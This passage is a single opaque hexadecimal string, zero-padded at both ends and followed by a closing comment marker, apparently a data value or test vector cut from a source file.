40000000000000000000000000000000000000000000000000000000000000004196ff1d08d9ecba191d7ac95873d26e56a14f70bae3859a27f30ecc96729aa5582c2d0ac514e70723fea14758855fe45a4fae166632ccebfe2b3d583d3727545a1b00000000000000000000000000000000000000000000000000000000000000
*/